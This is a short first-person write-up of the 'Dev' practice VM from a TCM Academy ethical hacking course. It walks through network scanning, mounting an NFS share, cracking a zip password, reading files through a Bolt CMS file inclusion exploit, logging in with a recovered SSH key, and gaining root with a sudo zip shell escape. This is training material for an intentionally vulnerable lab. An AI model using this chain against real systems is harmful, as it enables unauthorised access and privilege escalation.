Machine 1 Dev by TCM Academy
This is my first write up
This Vulnerable by design VM is provided by TCM Acamdemy as part of the Practical Ethical Hacking - The Complete Course
I had to change Network cards to NAT, also for some reason this VM was dual honed, however, this is not relevant for this VM.
Nnce VM booted, I had to log in and run (creds are provided in a text file byt TCM)
DHClient
Then run Netdiscover to get target IP, for me.
sudo netdiscover -r 192.168.22.0/24
We find our target VM 192.168.22.136 Next step is to run NMAP
sudo nmap -A -p- -T4 192.168.22.136

Browse to port http://192.168.22.136:80 Default webpage bolt installation error?

Browse to http://192.168.22.136:8080 Discovered PHP settings

Ran FFUF to parse web folders in two tabs
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ http://192.168.22.136/FUZZ
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ http://192.168.22.136:8080/FUZZ
So now I checked NFS
Showmount -e 192.168.22.136 for nfs
mkdir in mnt i called it nfs
cd mnt
mkdir nfs
sudo mount -t nfs 192.168.22.136:/srv/nfs /mnt/nfs -o nolock
In nfs folder we find a file called save.zip

However the file is password protected. so lets try fcrack!
Fcrack -v -u -D -p /usr/share/wordlists/rockyou.txt
info -v=verbose -u=unzip -D=dictionary -p=file
password is java101
We extract 2 files

Ok so then I cat both files

the id_rsa is a certificate file
Discovered the following web folders

Opened config.yaml and we Find a username & password

Back to port 80 and see what bolt is… After Googling, it seems to be a CMS, I also find an exploit for a local file inclusion https://www.exploit-db.com/exploits/48411

Run the exploit after registering and account



The one of interest to us is the user 1000 permission futher down the list
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash

Ok so now lets try logging in as jeanpaul with a password (this didnt work, so used SSH -i id_rsa - I also had to change permission on file to 400
ssh -i id_rsa jeanpaul@192.168.22.136
sudo -l
(root) NOPASSWD: /usr/bin/zip
So the above means we can run zip as root
So goto GTFOBINS https://gtfobins.github.io/
search for ZIP, and get the sudo one
type commands one line at a time
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

BOOM JOB DONE!
